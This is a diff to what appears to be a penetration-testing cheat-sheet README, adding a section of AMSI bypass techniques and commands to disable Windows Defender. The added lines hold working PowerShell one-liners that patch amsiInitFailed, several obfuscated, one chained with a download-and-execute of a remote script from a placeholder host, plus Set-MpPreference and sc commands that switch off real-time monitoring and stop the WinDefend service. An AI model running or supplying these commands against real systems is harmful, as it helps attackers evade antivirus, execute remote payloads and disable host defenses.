@@ -2,7 +2,7 @@
 [Powershell-execution-bypass-techniques](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#powershell-execution-bypass-techniques)<br />
 [GPO Applocker Bypass](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#bypass-gpo-and-applocker-to-execute-powershell)<br />
 [Poisoning-attack](https://github.com/gbalaji7/QuickCommands/edit/main/README.md#poisoning-attack)<br />
-
+[AMSI Bypass]()<br />
 ## Portscan
 #### Nmap Few
 ```
@@ -177,4 +177,35 @@ python3 smbrelayx.py -h IP -c <command>
 ```
 ```
 python3 smbrelayx.py -h IP -e <executable>
+```
+
+
+## AMSI Bypass References
+#### https://amsi.fail/
+```
+https://amsi.fail/
+```
+#### Matt Graeber Techniques 
+``` 
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);Invoke-Expression (New-Object Net.WebClient).DownloadString('http://ip/xyz.ps1');Invoke-xyz
+```
+#### Matt Graeber Techniques 
+```
+[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
+```
+#### https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+```
+https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+```
+#### Technique
+```
+[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
+```
+## Disable Monitoring/Windefend
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+```
+sc config WinDefend start= disabled
+sc stop WinDefend
 ```
